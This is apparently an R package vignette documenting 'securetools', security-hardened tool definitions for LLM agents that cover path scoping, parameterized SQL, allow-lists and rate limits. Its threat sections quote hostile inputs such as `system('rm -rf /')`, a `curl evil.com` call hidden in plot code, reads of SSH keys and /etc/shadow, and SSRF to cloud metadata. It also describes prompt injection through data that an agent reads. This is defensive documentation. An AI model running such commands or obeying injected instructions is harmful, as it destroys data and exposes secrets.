---
title: "Getting Started with securetools"
output: rmarkdown::html_vignette
vignette: >
  %\VignetteIndexEntry{Getting Started with securetools}
  %\VignetteEngine{knitr::rmarkdown}
  %\VignetteEncoding{UTF-8}
---

```{r, include = FALSE}
knitr::opts_chunk$set(
  collapse = TRUE,
  comment = "#>",
  eval = FALSE
)
```

## Why Security-Hardened Tools?

When you give an LLM agent access to tools, you are handing executable
capabilities to a system that was trained to be helpful -- not to be safe.
A model that can call `system()` can run arbitrary shell commands. A model
with unrestricted file write can overwrite `/etc/passwd` or plant a reverse
shell. A model with raw SQL access can `DROP TABLE users` or exfiltrate
every row from your production database.

These are not theoretical risks. Research on prompt injection and
adversarial tool use has demonstrated that LLM agents will follow
carefully-crafted instructions embedded in untrusted data -- a user-uploaded
CSV, a web page fetched by the agent, or even a crafted column name in a
database result. If the tools available to the agent have no inherent safety
boundaries, a single successful injection can compromise the host system.

securetools addresses this by providing **pre-built tool definitions where
security constraints are structural, not advisory**. Instead of telling the
model "please only read files in this directory," the tool physically
cannot access files outside the allowed directories. Instead of hoping the
model will avoid SQL injection, the tool accepts structured parameters and
constructs parameterized queries internally. The agent never sees raw SQL,
raw file paths outside the sandbox, or unrestricted HTTP access. Security
is enforced by the tool, not requested from the model.

## Overview

securetools provides pre-built, security-hardened tool definitions for use
with [securer](https://github.com/ian-flores/securer). Each tool factory
returns a `securer::securer_tool()` object with built-in constraints: path
scoping, parameterized SQL, domain allow-lists, size limits, and rate
limiting.

## How Tool Execution Works

Every securetools call follows the same execution flow. Understanding this
flow is key to understanding why the security model is robust -- validation
happens in the parent process, which the sandbox cannot influence.

```
  LLM Agent                 Parent Process (R)              Sandbox (securer)
  =========                 ==================              =================
      |                            |                               |
      |--- tool_call(args) ------->|                               |
      |                            |                               |
      |                     1. Validate args:                      |
      |                        - Check rate limit                  |
      |                        - Resolve symlinks                  |
      |                        - Match allow-lists                 |
      |                        - Verify size limits                |
      |                            |                               |
      |                     2. Reject? -----> Error to LLM         |
      |                            |                               |
      |                     3. Pass validated -------> Execute     |
      |                        call to sandbox         in sandbox  |
      |                            |                               |
      |                            |<------------- Result ---------|
      |                            |                               |
      |<--- result/error ----------|                               |
```

The crucial insight: **validation runs in the parent process**, which the
sandboxed code cannot modify or bypass. Even if a sandbox escape were
possible, the parent-level checks (path scoping, rate limits, SQL
parameterization) still apply because they execute before the call ever
reaches the sandbox.

## Installation

```{r install}
# install.packages("pak")
pak::pak("ian-flores/securetools")
```

## Quick Example

```{r setup}
library(securetools)
library(securer)
```

### Calculator Tool

**The threat:** An LLM asked to "calculate" something might generate
arbitrary R code instead of a simple arithmetic expression. Without
validation, `calculator(expression = "system('rm -rf /')")` would
execute a destructive shell command. Code injection through expression
evaluation is one of the oldest and most dangerous attack vectors.

The calculator tool evaluates mathematical expressions safely via AST
validation. It parses the expression into an abstract syntax tree and
walks every node, verifying that only arithmetic operators, math functions,
and numeric literals are present. Variable access, assignment, and
arbitrary function calls are all rejected before evaluation ever occurs.

```{r calculator}
calc <- calculator_tool()
session <- SecureSession$new(tools = list(calc))

session$execute('calculator(expression = "sqrt(144) + 2^3")')
#> [1] 20

# This is rejected -- system() is not an allowed function:
session$execute('calculator(expression = "system(\'whoami\')")')
#> Error: Function not allowed in calculator: `system`

session$close()
```

### File I/O Tools

**The threat:** An agent with unrestricted file access can read secrets
(`~/.ssh/id_rsa`, `.env` files, `/etc/shadow`) or write to sensitive
locations. Path traversal attacks using `../../` sequences or symlinks
let an attacker escape any intended directory. An agent might also
exhaust disk space by writing extremely large files in a loop.

File I/O tools enforce path scoping with symlink resolution, size limits,
and directory allow-lists. Reading and writing are scoped independently
so you can give an agent read access to source data without granting
write access to the same directory:

```{r file-io}
# Only allow access to a specific directory
data_dir <- "/path/to/project/data"

reader <- read_file_tool(
  allowed_dirs = data_dir,
  max_file_size = "50MB",
  max_rows = 10000
)

writer <- write_file_tool(
  allowed_dirs = data_dir,
  max_file_size = "10MB",
  overwrite = FALSE
)

session <- SecureSession$new(tools = list(reader, writer))

# Read a CSV -- auto-detects format from extension
session$execute('
  data <- read_file(path = "/path/to/project/data/input.csv", format = "auto")
  head(data)
')

# Write results -- path traversal is blocked
session$execute('
  result <- data.frame(x = 1:5, y = letters[1:5])
  write_file(
    path = "/path/to/project/data/output.csv",
    content = result,
    format = "csv"
  )
')

session$close()
```

### SQL Query Tool

**The threat:** SQL injection is among the most well-known and
devastating attack classes. An LLM given a raw SQL interface can be
tricked (via prompt injection in user data or fetched content) into
running `DROP TABLE`, `UNION SELECT` for data exfiltration, or
`INSERT`/`UPDATE` to tamper with records. Traditional parameterized
queries help, but they still require the developer to use them correctly.

securetools takes a more radical approach: **the agent never writes SQL
at all**. The `query_sql_tool()` provides a structured interface where
the agent specifies a table name, column list, and optional filter.
The tool constructs the SQL internally using parameterized queries.
Injection is not merely mitigated -- it is structurally impossible
because the agent has no mechanism to supply raw SQL strings:

```
  Agent Request                           Tool Internals
  =============                           ==============
  table = "users"             --->   SELECT name, email
  columns = "name, email"           FROM users
  filter_column = "active"          WHERE active = ?
  filter_value = "1"                 [bound: "1"]
```

The table and column names are validated against allow-lists. Only
pre-approved tables can be queried, and column names are checked for
SQL injection patterns before being interpolated into the query.

```{r sql}
library(DBI)
con <- dbConnect(RSQLite::SQLite(), "app.db")

sql_tool <- query_sql_tool(

  conn = con,
  allowed_tables = c("users", "orders"),
  max_rows = 1000
)

session <- SecureSession$new(tools = list(sql_tool))

# Query with filter -- uses parameterized query internally
session$execute('
  query_sql(
    table = "users",
    columns = "name, email",
    filter_column = "active",
    filter_value = "1"
  )
')

session$close()
dbDisconnect(con)
```

### URL Fetch Tool

**The threat:** An agent with unrestricted HTTP access can perform
Server-Side Request Forgery (SSRF) -- making requests to internal
services (`http://169.254.169.254` for cloud metadata, `http://localhost:8080`
for internal APIs) that are invisible from the public internet. It can
also exfiltrate data by POSTing to attacker-controlled endpoints, or
overwhelm external APIs with unbounded request loops.

The URL fetch tool constrains network access with domain allow-lists
(using glob patterns for subdomain matching), protocol restrictions
(HTTP/HTTPS only), private IP blocking, response size limits, and
rate limiting:

```{r fetch}
fetcher <- fetch_url_tool(
  allowed_domains = c("api.github.com", "*.githubusercontent.com"),
  max_response_size = "1MB",
  timeout_secs = 30,
  max_calls_per_minute = 10
)

session <- SecureSession$new(tools = list(fetcher))

session$execute('
  result <- fetch_url(url = "https://api.github.com/zen", method = "GET")
  result$body
')

session$close()
```

### Data Profiling

**The threat:** Profiling enormous datasets without limits can exhaust
memory and crash the host process. The `data_profile_tool()` enforces
row limits through sampling, ensuring that even multi-million-row data
frames are summarized safely without resource exhaustion.

Compute summary statistics for data frames:

```{r profile}
profiler <- data_profile_tool(max_rows = 100000)
session <- SecureSession$new(tools = list(profiler))

session$execute('
  profile <- data_profile(data = iris)
  profile$columns[[1]]  # Sepal.Length stats
')

session$close()
```

### Plot Tool

**The threat:** R's plotting system is powerful enough to execute
arbitrary code. An expression like `plot(x); system("curl evil.com")` embeds
a system call inside what looks like plotting code. Without restrictions,
the plot tool becomes a general-purpose code execution backdoor.

The plot tool evaluates plot expressions in a restricted environment
where only safe base R and graphics functions are available. Output
is also path-scoped and size-limited to prevent writing oversized files
to arbitrary locations:

```{r plot}
plotter <- plot_tool(
  allowed_dirs = "/path/to/output",
  max_file_size = "5MB"
)

session <- SecureSession$new(tools = list(plotter))

session$execute('
  plot(
    path = "/path/to/output/chart.png",
    plot_code = "hist(rnorm(1000), main = \"Distribution\")",
    width = 8,
    height = 6
  )
')

session$close()
```

### R Help Lookup

**The threat:** Unrestricted documentation lookup might seem harmless,
but it can leak information about installed packages and system
configuration. The `allowed_packages` parameter restricts which packages
can be queried, keeping the agent's awareness scoped to what you intend.

The `r_help_tool()` provides safe access to R documentation:

```{r r-help}
help_tool <- r_help_tool(allowed_packages = c("base", "stats", "utils"))

session <- SecureSession$new(tools = list(help_tool))

# Look up documentation for a function
result <- session$call("r_help", topic = "mean", package = "base")
cat(result)

session$close()
```

The `allowed_packages` parameter restricts which packages can be queried,
preventing access to documentation of packages that may not be appropriate.

## Security Model

Every tool enforces constraints at the **parent process** level, not in
the sandbox. This means even if the sandbox is somehow bypassed, tool-level
protections still hold:
- **Path scoping**: symlinks are resolved before checking allowed directories
- **Parameterized SQL**: structured interface prevents injection by design
- **Domain allow-lists**: URL validation before any HTTP request
- **Size limits**: checked after serialization (write) or before processing (read)
- **Rate limiting**: per-tool lifetime and/or sliding window limits
- **AST validation**: calculator expression safety via recursive AST walking

## Security Considerations

### Threat Model

securetools is designed to protect against an untrusted LLM agent attempting to:

- **Read sensitive files**: Path validation with symlink resolution prevents directory traversal
- **Write to arbitrary locations**: Write paths are validated against allowed directories
- **Execute arbitrary code**: Calculator uses AST validation; plot tool restricts to plotting functions
- **Access internal services (SSRF)**: URL fetching validates protocols (HTTP/HTTPS only) and blocks private IPs
- **SQL injection**: Structured query interface with parameterized filters prevents raw SQL injection
- **Resource exhaustion**: Rate limiting and size limits constrain resource usage

### Known Limitations

- **TOCTOU races**: Between path validation and file I/O, a symlink could theoretically be swapped. Use `validate_written_path()` for post-write verification.
- **Rate limiting is per-process**: Limits reset if the R process restarts. For persistent rate limiting, use an external mechanism.
- **DNS rebinding**: The private IP check resolves DNS before the request, but sophisticated DNS rebinding attacks could theoretically bypass this.
- **Base R access in restricted environments**: The plot tool's restricted environment still provides access to safe base R functions. The allowlist is comprehensive but may need updates for new R versions.

### Working with SecureSession

When tools are called through `SecureSession` IPC, all tool arguments must be specified
explicitly. The child process wrappers do not carry default values from the tool factory.
For example, always specify `format = "auto"` even though it's the default in direct usage.

## Rate Limiting

Agent loops are inherently unbounded -- a ReAct agent will keep calling
tools until it decides it has an answer (or hits a token limit). Without
explicit rate limiting, a confused or manipulated agent could make
thousands of API calls, exhaust disk I/O, or run up cloud costs. Rate
limiting provides a hard safety boundary independent of the LLM's
decision-making.

All tool factories accept `max_calls` for lifetime rate limiting. Some
tools (like `fetch_url_tool()`) also support `max_calls_per_minute` for
sliding-window throttling. When a limit is hit, the tool returns an
error message to the LLM rather than silently failing, giving the
agent a chance to adjust its strategy:

```{r rate-limit}
# Allow only 100 calculator evaluations per session
calc <- calculator_tool(max_calls = 100)

# URL fetch with both lifetime and per-minute limits
fetcher <- fetch_url_tool(
  max_calls = 1000,
  max_calls_per_minute = 10
)
```

## Available Tools

| Tool | Factory | Key Security Features |
|------|---------|----------------------|
| Calculator | `calculator_tool()` | AST validation, no code injection |
| Data Profile | `data_profile_tool()` | Row sampling for large data |
| Read File | `read_file_tool()` | Path scoping, size limits |
| Write File | `write_file_tool()` | Path scoping, size limits, overwrite protection |
| SQL Query | `query_sql_tool()` | Table allow-list, parameterized queries |
| URL Fetch | `fetch_url_tool()` | Domain allow-list, rate limiting |
| Plot | `plot_tool()` | Path scoping, output size limits |
| R Help | `r_help_tool()` | Package allow-list |
